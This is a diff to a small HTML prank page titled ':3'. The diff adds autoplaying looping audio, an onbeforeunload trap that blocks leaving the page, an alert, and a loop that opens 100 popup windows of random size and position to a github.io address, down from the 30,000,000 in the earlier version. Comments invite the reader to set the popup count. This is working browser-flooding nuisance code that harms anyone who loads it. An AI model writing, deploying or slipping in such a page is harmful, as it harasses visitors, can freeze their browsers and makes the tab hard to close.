@@ -1,24 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>ok</title>
+  <title>:3</title>
+</head>
+<body>
+  <audio id="music" autoplay loop>
+    <source src="trolling.mp3" type="audio/mpeg">
+  </audio>
+
   <script type="text/javascript">
     onbeforeunload = () => true;
+
+    function getRandomNumber(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
 
     function openMultiplePopups(count) {
       for (let i = 0; i < count; i++) {
         const url = 'https://uexedus.github.io/'; // Replace with the desired URL
-        window.open(url, 'popUpWindow' + i, 'height=300,width=400,left=100,top=100');
+        const randomWidth = getRandomNumber(200, 800);
+        const randomHeight = getRandomNumber(200, 600);
+        const randomLeft = getRandomNumber(0, window.innerWidth - randomWidth);
+        const randomTop = getRandomNumber(0, window.innerHeight - randomHeight);
+        window.open(url, 'popUpWindow' + i, `height=${randomHeight},width=${randomWidth},left=${randomLeft},top=${randomTop}`);
       }
     }
+
     {
       alert(':3');
       setTimeout(function(){
-        openMultiplePopups(30000000); // Change the number to open the desired count of popups
+        openMultiplePopups(100); // Change the number to open the desired count of popups
       }, 0);
     }
   </script>
-</head>
-<body>
 </body>
 </html>
